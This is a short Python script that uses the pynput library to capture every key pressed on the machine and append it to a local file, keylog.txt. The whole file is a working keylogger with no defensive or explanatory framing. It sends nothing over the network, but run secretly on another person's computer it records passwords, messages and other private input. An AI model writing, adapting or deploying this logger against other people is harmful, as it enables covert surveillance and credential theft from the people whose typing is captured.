from pynput.keyboard import Key,Listener

def on_press(key):
    with open("keylog.txt",'a') as keylog:
        if key == Key.space:
            key = ' '
        elif key == Key.enter:
            key = '\n'
        keylog.write(str(key).strip("'"))
    

with Listener(on_press=on_press) as listener:
    listener.join()